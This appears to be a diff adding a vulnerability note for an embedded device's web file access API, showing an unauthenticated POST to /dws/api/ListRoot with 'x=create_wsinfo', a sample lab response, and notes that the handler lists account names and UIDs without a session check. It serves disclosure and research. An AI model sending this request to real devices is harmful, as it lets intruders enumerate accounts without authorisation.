@@ -1,0 +1,19 @@
+# Pre-auth information disclosure: create_wsinfo
+# POST /dws/api/ListRoot  body: x=create_wsinfo  (no session, no credentials)
+HTTP/1.1 200 OK
+Content-type: text/plain
+Transfer-Encoding: chunked
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=-1
+Date: Mon, 03 Jan 2011 00:52:04 GMT
+Server: lighttpd/1.4.28
+
+Web File Access login Users Info:
+
+There is no Web File Access user login!
+
+# Notes:
+# - In main(), when the first form value equals "create_wsinfo", print_wsinfo() runs without
+#   any session check and lists the Web File Access accounts (account name, UID, timestamp)
+#   from /var/tmp/ws_login_info and /var/tmp/uid_info_*.
+# - The example above is from a lab device with no accounts configured; on a provisioned
+#   device the output would enumerate the account names.
